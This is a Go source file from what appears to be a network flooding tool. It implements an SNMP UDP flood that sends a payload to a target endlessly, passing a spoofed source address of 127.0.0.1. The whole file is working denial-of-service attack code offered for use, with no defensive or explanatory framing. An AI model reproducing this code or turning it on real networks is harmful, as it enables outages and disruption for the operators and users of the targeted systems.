package udp

import (
	"net"

	"github.com/levigross/mabul/networking"
)

// DerAttacker has our basic attack functionality
type DerAttacker interface {
	SetAttacker(*Attacker)
	SetPayload([]byte)
	Attack() error
}

var _ DerAttacker = &SNMPFlood{}

// SNMPFlood will flood the attacker with packets
type SNMPFlood struct {
	attacker *Attacker
	payload  []byte
}

// Attack does what it says it will do
func (s *SNMPFlood) Attack() error {
	if s.payload == nil {
		s.payload = SNMPPayload
	}
	e, err := networking.NewEndPoint(
		s.attacker.Target.IPAddress,
		s.attacker.Target.DstPort,
		s.attacker.Target.InterfaceName)
	if err != nil {
		return err
	}
	for {
		if err := e.SendUDPPacket(s.payload, net.ParseIP("127.0.0.1")); err != nil {
			return err
		}
	}
}

// SetPayload allows you to set a custom payload
func (s *SNMPFlood) SetPayload(payload []byte) {
	s.payload = payload
}

// SetAttacker sets the attacker
func (s *SNMPFlood) SetAttacker(a *Attacker) {
	s.attacker = a
}
